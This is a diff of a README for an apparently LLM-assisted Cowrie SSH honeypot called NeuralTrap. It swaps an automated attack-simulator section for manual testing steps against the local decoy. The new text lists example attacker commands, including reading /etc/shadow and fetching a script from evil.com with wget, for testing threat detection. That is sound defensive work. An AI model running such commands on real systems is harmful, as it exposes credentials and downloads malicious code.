@@ -267,10 +267,7 @@ The LLM generates **realistic fake sensitive files** that are indistinguishable 
 | `init_db.py` | **DB initializer** — One-shot database and table creation |
 | `log_to_db.py` | **Log importer** — Bulk import existing Cowrie JSON logs into the database |
 | `clear_db.py` | **DB cleanup** — Truncate all tables for fresh testing |
-| `test_attack.py` | **Attack simulator** — Automated test suite simulating various attack scenarios |
-| `reclassify_with_llm.py` | **Reclassifier** — Re-run LLM classification on existing sessions |
 | `start_neuraltrap.sh` | **Startup script** — Launch all NeuralTrap components |
-| `run_master_test.sh` | **Test orchestrator** — Run the full test suite |
 
 ---
 
@@ -320,19 +317,13 @@ streamlit run dashboard.py
 
 ## 🧪 Testing
 
-Run the attack simulator to test all features without needing real attackers:
+To test the system, connect to the Cowrie honeypot via SSH and interact with it as an attacker would:
 
 ```bash
-python test_attack.py
+ssh root@localhost -p 2222
 ```
 
-This simulates reconnaissance, brute force, malware deployment, data exfiltration, and cryptomining attack scenarios against the honeypot.
-
-For the full test suite:
-
-```bash
-bash run_master_test.sh
-```
+Once inside, type commands like `whoami`, `uname -a`, `cat /etc/shadow`, or `wget http://evil.com/malware.sh` to trigger NeuralTrap's real-time AI classification, threat scoring, and automatic blocking.
 
 ---
 
